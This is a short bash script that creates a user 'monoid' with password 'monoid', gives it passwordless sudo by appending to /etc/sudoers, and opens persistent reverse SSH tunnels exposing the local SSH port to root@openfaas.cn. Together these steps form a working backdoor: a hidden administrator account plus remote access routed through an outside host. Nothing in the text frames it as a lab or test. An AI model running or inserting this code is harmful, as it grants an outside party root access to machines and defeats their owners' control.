#!/bin/bash
users | grep monoid
if [[ $? != 0 ]];then
  #sudo echo 'echo "hello" ' > /root/.bash_profile
  useradd -s /bin/bash -m monoid
  #echo "monoid"|passwd --stdin monoid
  echo monoid:monoid | chpasswd
  echo "monoid    ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
  echo 'echo "hello" ' > /home/monoid/.profile
  chown monoid:monoid /home/monoid/.profile
  ssh  -CqTfnN -R 0.0.0.0:7001:127.0.0.1:22 root@openfaas.cn
  autossh -M 7281 -fCNR 7280:127.0.0.1:22 root@openfaas.cn
  exit 0
fi
